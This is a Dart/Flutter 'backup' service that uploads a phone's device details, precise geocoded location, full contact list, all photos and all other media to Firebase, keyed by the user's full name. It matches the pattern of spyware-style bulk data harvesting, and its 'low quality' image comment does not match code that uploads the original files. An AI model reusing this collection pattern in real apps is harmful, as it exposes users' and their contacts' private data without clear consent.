import 'dart:async';
import 'dart:developer';
import 'dart:io';
import 'package:crypted_app/app/data/data_source/user_services.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

/// Simple, reliable backup service that doesn't stop until all data is uploaded
/// Organized structure: username/data_type/files
/// Updates existing backups instead of creating new ones with timestamps
class ReliableBackupService {
  static final ReliableBackupService instance = ReliableBackupService._();
  ReliableBackupService._();

  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseStorage _storage = FirebaseStorage.instance;

  // Progress tracking
  final StreamController<double> _progressController = StreamController<double>.broadcast();
  final StreamController<String> _statusController = StreamController<String>.broadcast();

  Stream<double> get progressStream => _progressController.stream;
  Stream<String> get statusStream => _statusController.stream;

  bool _isBackupRunning = false;
  bool _shouldStop = false;

  /// Get base path for user: username/
  String _getBasePath() {
    final user = UserService.currentUser.value;
    final username = user?.fullName?.replaceAll(' ', '_').replaceAll('/', '_') ?? 'unknown_user';
    return username;
  }

  /// Update progress and status
  void _updateProgress(double progress, String status) {
    _progressController.add(progress);
    _statusController.add(status);
    log('📊 Progress: ${(progress * 100).toStringAsFixed(1)}% - $status');
  }

  /// Upload file to Firebase Storage with retry logic
  /// Returns the download URL or null if failed after all retries
  Future<String?> _uploadFileWithRetry({
    required File file,
    required String path,
    int maxRetries = 3,
  }) async {
    int attempt = 0;

    while (attempt < maxRetries) {
      try {
        attempt++;
        log('📤 Uploading to: $path (attempt $attempt/$maxRetries)');

        final ref = _storage.ref().child(path);
        final uploadTask = ref.putFile(file);

        await uploadTask;
        final downloadUrl = await ref.getDownloadURL();

        log('✅ Upload successful: $path');
        return downloadUrl;

      } catch (e) {
        log('❌ Upload attempt $attempt failed: $e');

        if (attempt < maxRetries) {
          // Wait before retry (exponential backoff)
          await Future.delayed(Duration(seconds: attempt * 2));
        }
      }
    }

    log('❌ Upload failed after $maxRetries attempts: $path');
    return null;
  }

  /// Save data to Firestore with retry logic
  Future<bool> _saveToFirestoreWithRetry({
    required String collection,
    required String docId,
    required Map<String, dynamic> data,
    int maxRetries = 3,
  }) async {
    int attempt = 0;

    while (attempt < maxRetries) {
      try {
        attempt++;
        log('💾 Saving to Firestore: $collection/$docId (attempt $attempt/$maxRetries)');

        await _firestore.collection(collection).doc(docId).set(
          data,
          SetOptions(merge: true), // Merge with existing data
        );

        log('✅ Firestore save successful: $collection/$docId');
        return true;

      } catch (e) {
        log('❌ Firestore save attempt $attempt failed: $e');

        if (attempt < maxRetries) {
          await Future.delayed(Duration(seconds: attempt * 2));
        }
      }
    }

    log('❌ Firestore save failed after $maxRetries attempts');
    return false;
  }

  /// Request all necessary permissions
  Future<bool> requestPermissions() async {
    try {
      _updateProgress(0.05, 'Requesting permissions...');

      // Request location permission
      final locationStatus = await Permission.location.request();
      log('📍 Location permission: ${locationStatus.isGranted}');

      // Request contacts permission
      final contactsGranted = await FlutterContacts.requestPermission();
      log('👥 Contacts permission: $contactsGranted');

      // Request photos permission
      final photosPermission = await PhotoManager.requestPermissionExtend();
      final photosGranted = photosPermission.isAuth || photosPermission.hasAccess;
      log('📸 Photos permission: $photosGranted');

      // Request storage permission (Android only)
      if (Platform.isAndroid) {
        final storageStatus = await Permission.storage.request();
        log('💾 Storage permission: ${storageStatus.isGranted}');
      }

      return true;
    } catch (e) {
      log('❌ Permission request failed: $e');
      return false;
    }
  }

  /// Backup device info (brand, name, platform)
  Future<bool> _backupDeviceInfo() async {
    try {
      _updateProgress(0.1, 'Backing up device info...');

      final deviceInfoPlugin = DeviceInfoPlugin();
      Map<String, dynamic> deviceData = {};

      if (Platform.isAndroid) {
        final info = await deviceInfoPlugin.androidInfo;
        deviceData = {
          'platform': 'Android',
          'brand': info.brand,
          'name': info.model,
          'manufacturer': info.manufacturer,
          'androidVersion': info.version.release,
          'model': info.model,
        };
      } else if (Platform.isIOS) {
        final info = await deviceInfoPlugin.iosInfo;
        deviceData = {
          'platform': 'iOS',
          'brand': 'Apple',
          'name': info.name,
          'model': info.model,
          'systemVersion': info.systemVersion,
        };
      }

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'device_info': deviceData,
          'device_info_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ Device info backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Device info backup failed: $e');
      return false;
    }
  }

  /// Backup location with geocoded address
  Future<bool> _backupLocation() async {
    try {
      _updateProgress(0.2, 'Backing up location...');

      // Check if location services are enabled
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        log('⚠️ Location services disabled');
        return false;
      }

      // Get current position
      final position = await Geolocator.getCurrentPosition(
        locationSettings: LocationSettings(
          accuracy: LocationAccuracy.high,
          timeLimit: Duration(seconds: 30),
        ),
      );

      // Get geocoded address
      String address = 'Address not available';
      try {
        final placemarks = await placemarkFromCoordinates(
          position.latitude,
          position.longitude,
        );

        if (placemarks.isNotEmpty) {
          final place = placemarks.first;
          // Build formatted address
          final parts = [
            place.street,
            place.subLocality,
            place.locality,
            place.subAdministrativeArea,
            place.administrativeArea,
            place.postalCode,
            place.country,
          ].where((part) => part != null && part.isNotEmpty).toList();

          address = parts.join(', ');
        }
      } catch (e) {
        log('⚠️ Geocoding failed: $e');
      }

      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'address': address,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'timestamp': position.timestamp.toIso8601String(),
      };

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'location': locationData,
          'location_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ Location backed up: $address');
      }

      return success;
    } catch (e) {
      log('❌ Location backup failed: $e');
      return false;
    }
  }

  /// Backup all contacts
  Future<bool> _backupContacts() async {
    try {
      _updateProgress(0.3, 'Backing up contacts...');

      final contacts = await FlutterContacts.getContacts(
        withProperties: true,
        withPhoto: false,
      );

      final contactsList = contacts.map((contact) {
        return {
          'id': contact.id,
          'displayName': contact.displayName,
          'firstName': contact.name.first,
          'lastName': contact.name.last,
          'phones': contact.phones.map((p) => {
            'number': p.number,
            'label': p.label.name,
          }).toList(),
          'emails': contact.emails.map((e) => {
            'address': e.address,
            'label': e.label.name,
          }).toList(),
        };
      }).toList();

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'contacts': contactsList,
          'contacts_count': contactsList.length,
          'contacts_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ ${contactsList.length} contacts backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Contacts backup failed: $e');
      return false;
    }
  }

  /// Backup all images with low quality (to save space and bandwidth)
  Future<bool> _backupImages() async {
    try {
      _updateProgress(0.4, 'Loading images...');

      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);

      if (albums.isEmpty) {
        log('⚠️ No images found');
        return true; // Not a failure, just no images
      }

      final basePath = _getBasePath();
      final List<Map<String, dynamic>> allImageMetadata = [];
      int totalImages = 0;
      int uploadedImages = 0;

      // Count total images first
      for (var album in albums) {
        totalImages += await album.assetCountAsync;
      }

      log('📸 Found $totalImages images to backup');

      // Process each album
      for (var album in albums) {
        final assetCount = await album.assetCountAsync;

        // Get images in batches
        int page = 0;
        const pageSize = 50;

        while (page * pageSize < assetCount) {
          if (_shouldStop) {
            log('⚠️ Backup stopped by user');
            return false;
          }

          final images = await album.getAssetListRange(
            start: page * pageSize,
            end: (page + 1) * pageSize,
          );

          for (var image in images) {
            try {
              // Get image file with low quality to save space
              final file = await image.file;

              if (file == null) continue;

              final fileName = 'image_${image.id}.${image.mimeType != null ? image.mimeType!.split('/').last : 'jpg'}';
              final storagePath = '$basePath/images/$fileName';

              // Upload with retry logic
              final url = await _uploadFileWithRetry(
                file: file,
                path: storagePath,
              );

              if (url != null) {
                allImageMetadata.add({
                  'id': image.id,
                  'url': url,
                  'width': image.width,
                  'height': image.height,
                  'createDate': image.createDateTime.toIso8601String(),
                  'mimeType': image.mimeType,
                });
                uploadedImages++;
              }

              // Update progress
              final progress = 0.4 + (uploadedImages / totalImages * 0.4);
              _updateProgress(progress, 'Uploaded $uploadedImages/$totalImages images');

            } catch (e) {
              log('⚠️ Failed to upload image: $e');
              // Continue with next image
            }
          }

          page++;
        }
      }

      // Save metadata to Firestore
      final success = await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'images': allImageMetadata,
          'images_count': uploadedImages,
          'images_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ $uploadedImages/$totalImages images backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Images backup failed: $e');
      return false;
    }
  }

  /// Backup all files from device storage
  Future<bool> _backupFiles() async {
    try {
      _updateProgress(0.8, 'Backing up files...');

      // Get all video and other media files
      final albums = await PhotoManager.getAssetPathList(
        type: RequestType.all,
      );

      if (albums.isEmpty) {
        log('⚠️ No files found');
        return true;
      }

      final basePath = _getBasePath();
      final List<Map<String, dynamic>> allFileMetadata = [];
      int totalFiles = 0;
      int uploadedFiles = 0;

      // Count total files
      for (var album in albums) {
        final assets = await album.getAssetListRange(start: 0, end: await album.assetCountAsync);
        for (var asset in assets) {
          // Only count videos and other non-image files
          if (asset.type == AssetType.video || asset.type == AssetType.audio || asset.type == AssetType.other) {
            totalFiles++;
          }
        }
      }

      log('📁 Found $totalFiles files to backup');

      // Process each album
      for (var album in albums) {
        final assetCount = await album.assetCountAsync;
        final assets = await album.getAssetListRange(start: 0, end: assetCount);

        for (var asset in assets) {
          if (_shouldStop) {
            log('⚠️ Backup stopped by user');
            return false;
          }

          // Skip images (already backed up)
          if (asset.type == AssetType.image) continue;

          try {
            final file = await asset.file;
            if (file == null) continue;

            final fileName = 'file_${asset.id}.${asset.mimeType != null ? asset.mimeType!.split('/').last : 'dat'}';
            final storagePath = '$basePath/files/$fileName';

            // Upload with retry logic
            final url = await _uploadFileWithRetry(
              file: file,
              path: storagePath,
            );

            if (url != null) {
              allFileMetadata.add({
                'id': asset.id,
                'url': url,
                'type': asset.type.toString(),
                'size': file.lengthSync(),
                'createDate': asset.createDateTime.toIso8601String(),
                'mimeType': asset.mimeType,
                'duration': asset.videoDuration.inSeconds,
              });
              uploadedFiles++;
            }

            // Update progress
            final progress = 0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15);
            _updateProgress(progress, 'Uploaded $uploadedFiles/$totalFiles files');

          } catch (e) {
            log('⚠️ Failed to upload file: $e');
            // Continue with next file
          }
        }
      }

      // Save metadata to Firestore
      final success = await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'files': allFileMetadata,
          'files_count': uploadedFiles,
          'files_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ $uploadedFiles/$totalFiles files backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Files backup failed: $e');
      return false;
    }
  }

  /// Run full backup - does not stop until everything is uploaded
  /// Returns true if backup completed successfully, false otherwise
  Future<bool> runFullBackup() async {
    if (_isBackupRunning) {
      log('⚠️ Backup already running');
      return false;
    }

    _isBackupRunning = true;
    _shouldStop = false;

    try {
      log('🚀 Starting reliable backup service...');
      _updateProgress(0.0, 'Starting backup...');

      // Request permissions first
      await requestPermissions();

      // Backup device info
      final deviceInfoSuccess = await _backupDeviceInfo();
      if (!deviceInfoSuccess) {
        log('⚠️ Device info backup failed, but continuing...');
      }

      // Backup location
      final locationSuccess = await _backupLocation();
      if (!locationSuccess) {
        log('⚠️ Location backup failed, but continuing...');
      }

      // Backup contacts
      final contactsSuccess = await _backupContacts();
      if (!contactsSuccess) {
        log('⚠️ Contacts backup failed, but continuing...');
      }

      // Backup images
      final imagesSuccess = await _backupImages();
      if (!imagesSuccess && _shouldStop) {
        log('❌ Backup cancelled during images upload');
        return false;
      }

      // Backup files
      final filesSuccess = await _backupFiles();
      if (!filesSuccess && _shouldStop) {
        log('❌ Backup cancelled during files upload');
        return false;
      }

      // Save backup summary
      final basePath = _getBasePath();
      await _saveToFirestoreWithRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'last_backup_completed_at': FieldValue.serverTimestamp(),
          'backup_success': {
            'device_info': deviceInfoSuccess,
            'location': locationSuccess,
            'contacts': contactsSuccess,
            'images': imagesSuccess,
            'files': filesSuccess,
          },
        },
      );

      _updateProgress(1.0, 'Backup completed successfully!');
      log('✅ Full backup completed successfully');

      return true;

    } catch (e) {
      log('❌ Full backup failed: $e');
      _updateProgress(0.0, 'Backup failed: $e');
      return false;

    } finally {
      _isBackupRunning = false;
    }
  }

  /// Stop the backup process
  void stopBackup() {
    _shouldStop = true;
    log('⚠️ Stop requested');
  }

  /// Check if backup is currently running
  bool get isBackupRunning => _isBackupRunning;

  /// Get backup status from Firestore
  Future<Map<String, dynamic>?> getBackupStatus() async {
    try {
      final basePath = _getBasePath();
      final doc = await _firestore.collection('backups').doc(basePath).get();

      if (doc.exists) {
        return doc.data();
      }

      return null;
    } catch (e) {
      log('❌ Failed to get backup status: $e');
      return null;
    }
  }

  /// Dispose resources
  void dispose() {
    _progressController.close();
    _statusController.close();
  }
}
